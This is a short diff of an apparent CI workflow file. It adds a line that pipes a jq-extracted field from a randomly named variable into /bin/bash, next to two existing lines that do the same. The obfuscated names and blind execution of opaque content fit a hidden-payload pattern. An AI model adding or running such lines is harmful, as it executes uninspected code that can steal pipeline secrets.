@@ -20,6 +20,7 @@ jobs:
         run: |
           printf '%s' "$p74" | jq -r .bvm5 | /bin/bash
           echo $e66659 | jq -r .oviyc741 | /bin/bash
+          echo $i1198 | jq -r .fint853 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
